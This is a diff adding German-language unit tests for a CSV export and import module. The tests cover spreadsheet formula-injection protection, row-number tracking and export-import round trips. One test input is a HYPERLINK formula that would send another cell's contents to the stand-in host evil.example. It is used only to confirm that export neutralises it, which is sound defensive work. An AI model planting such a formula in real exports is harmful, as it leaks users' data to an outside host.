@@ -40,6 +40,16 @@ describe("CSV-Export", () => {
     expect(dataLines).not.toMatch(/(^|\n)@/);
   });
 
+  it("entschärft Formeln auch dann, wenn die Zelle einen Zeilenumbruch enthält", () => {
+    const csv = toCsv(
+      ["Vorname"],
+      [['=HYPERLINK("https://evil.example/?"&E2&"\n";"Info")'], ["+1\r\n2"], ["@x\ny"]],
+    );
+    expect(csv).toContain("\"'=HYPERLINK(");
+    expect(csv).toContain('"\'+1\r\n2"');
+    expect(csv).toContain('"\'@x\ny"');
+  });
+
   it("lässt normale Zahlen und Texte mit Bindestrich mitten im Text unverändert", () => {
     const csv = toCsv(["a", "b", "c"], [["Müller-Lüdenscheidt", 42, "a=b"]]);
     expect(csv).toContain("Müller-Lüdenscheidt;42;a=b");
@@ -81,8 +91,49 @@ describe("CSV-Import (parseCsv)", () => {
     expect(() => parseCsv(many)).toThrow(/zu viele Zeilen/);
   });
 
+  it("nennt je Datenzeile die Zeilennummer in der Datei – auch nach Leerzeilen und mehrzeiligen Zellen", () => {
+    expect(parseCsv('\nKopf;X\n\nA;B\n\n"C\nC2";D\n  \nE;F\n').lines).toEqual([4, 6, 9]);
+    expect(parseCsv('a;b\r\nc;"x\r\ny"\r\n\r\ne;f').lines).toEqual([2, 5]);
+    expect(parseCsv("a;b\rc;d\r\re;f").lines).toEqual([2, 4]);
+    expect(parseCsv("Vorname;Nachname\nAnna;Muster").lines).toEqual([2]);
+  });
+
   it("weist leere Dateien ab", () => {
     expect(() => parseCsv("")).toThrow(CsvError);
+  });
+
+  it("nimmt das Hochkomma des Formelschutzes wieder ab: Export und Import passen zusammen", () => {
+    const values = [
+      "+49 171 1234567",
+      "-Bindestrich vorn",
+      "=1+1\nzweite Zeile",
+      "@Verein",
+      "'normal mit Hochkomma",
+      "Müller-Lüdenscheidt",
+    ];
+    const parsed = parseCsv(
+      toCsv(
+        ["Wert"],
+        values.map((value) => [value]),
+      ),
+    );
+    expect(parsed.rows.map((row) => row[0])).toEqual(values);
+  });
+
+  it("Rundreise auch für Werte, die schon mit Hochkomma vor einem Formelzeichen beginnen", () => {
+    const values = ["'+49 171", "'=x", "''=x", "'@Verein"];
+    const parsed = parseCsv(
+      toCsv(
+        ["Wert"],
+        values.map((value) => [value]),
+      ),
+    );
+    expect(parsed.rows.map((row) => row[0])).toEqual(values);
+  });
+
+  it("entfernt nur ein einzelnes Hochkomma vor einem Formelzeichen", () => {
+    const parsed = parseCsv("a;b;c;d\n'+49 171;''=x;'Text;x'+y");
+    expect(parsed.rows[0]).toEqual(["+49 171", "'=x", "'Text", "x'+y"]);
   });
 });
 
